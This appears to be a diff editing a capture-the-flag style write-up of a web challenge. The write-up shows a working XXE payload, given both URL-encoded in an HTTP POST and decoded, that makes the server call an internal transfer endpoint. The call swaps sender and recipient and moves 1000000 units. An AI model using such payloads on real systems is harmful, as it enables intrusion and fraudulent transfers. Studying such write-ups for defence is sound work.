@@ -27,10 +27,16 @@ xml=%3C%3Fxml+version%3D'1.0'+encoding%3D'ISO-8859-1'%3F%3E%3Ctransfer%3E%3Cto%3
 
 ```
 
-The `xml` parameter seens promissing. Here, url-decoded for clarity:
+The `xml` parameter seens promissing. Here, url-decoded and with linebreaks for clarity:
 
 ```XML
-<?xml+version='1.0'+encoding='ISO-8859-1'?><transfer><to>bruce@shaydmail.org</to><from>nakemeigbo1@sapo.pt</from><amount>1</amount><id>cda8441cc2e3122cfe048fcc587e0dff</id></transfer>
+<?xml+version='1.0'+encoding='ISO-8859-1'?>
+<transfer>
+    <to>bruce@shaydmail.org</to>
+    <from>nakemeigbo1@sapo.pt</from>
+    <amount>1</amount>
+    <id>cda8441cc2e3122cfe048fcc587e0dff</id>
+</transfer>
 ```
 
 Playing with the XML to trigger an error message, for instance by deleting the `<to>`. You get an error message showing some code:
@@ -50,9 +56,9 @@ From this you infer the `POST` with the XML triggers a backend request to `$endp
 
 So, right now you must be thinking *What if I invoke that internal endpoint switching the values of `to` and `from`, with the `amount` of 1000000*?
 
-You can do that with a combination of an [XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) and a [SSRF](https://cfdb.io/Web/Server-Side%20Request%20Forgery) you can do just that.
+You can do that with a combination of an [XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) and a [SSRF](https://cfdb.io/Web/Server-Side%20Request%20Forgery).
 
-It is easier to detect and validate the XXE fetching an external entity that points to a server you control, but will go immediately for the solution:
+It is easier to detect and validate the XXE fetching an external entity that points to a server you control, but we will go immediately for the solution:
 
 ```HTTP
 POST /operations.php HTTP/1.1
@@ -72,11 +78,20 @@ Connection: close
 xml=%3C%3Fxml%20version%3D%271.0%27%20encoding%3D%27ISO-8859-1%27%3F%3E%3C!DOCTYPE%20xxx%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Flocalhost%2Ftransfer.php%3Fto%3Dnakemeigbo1%40sapo.pt%26from%3Dbruce%40shaydmail.org%26amount%3D1000000%26id%3Dcda8441cc2e3122cfe048fcc587e0dff%22%20%3E%5D%3E%3Ctransfer%3E%3Ca%3E%26xxe%3B%3C%2Fa%3E%3Cto%3Ebruce%40shaydmail.org%3C%2Fto%3E%3Cfrom%3Enakemeigbo1%40sapo.pt%3C%2Ffrom%3E%3Camount%3E1%3C%2Famount%3E%3Cid%3Ecda8441cc2e3122cfe048fcc587e0dff%3C%2Fid%3E%3C%2Ftransfer%3E
 ```
 
-Decoded:
+Decoded, with linebreaks:
 ```XML
-<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE xxx [<!ENTITY xxe SYSTEM "http://localhost/transfer.php?to=nakemeigbo1@sapo.pt&from=bruce@shaydmail.org&amount=1000000&id=cda8441cc2e3122cfe048fcc587e0dff" >]><transfer><a>&xxe;</a><to>bruce@shaydmail.org</to><from>nakemeigbo1@sapo.pt</from><amount>1</amount><id>cda8441cc2e3122cfe048fcc587e0dff</id></transfer>```
+<?xml version='1.0' encoding='ISO-8859-1'?>
+<!DOCTYPE xxx [<!ENTITY xxe SYSTEM "http://localhost/transfer.php?to=nakemeigbo1@sapo.pt&from=bruce@shaydmail.org&amount=1000000&id=cda8441cc2e3122cfe048fcc587e0dff" >]>
+<transfer>
+    <a>&xxe;</a>
+    <to>bruce@shaydmail.org</to>
+    <from>nakemeigbo1@sapo.pt</from>
+    <amount>1</amount>
+    <id>cda8441cc2e3122cfe048fcc587e0dff</id>
+</transfer>
+```
 
-The server replies with 
+The server replies with:
 
 ```
 success. Refresh to update your balance
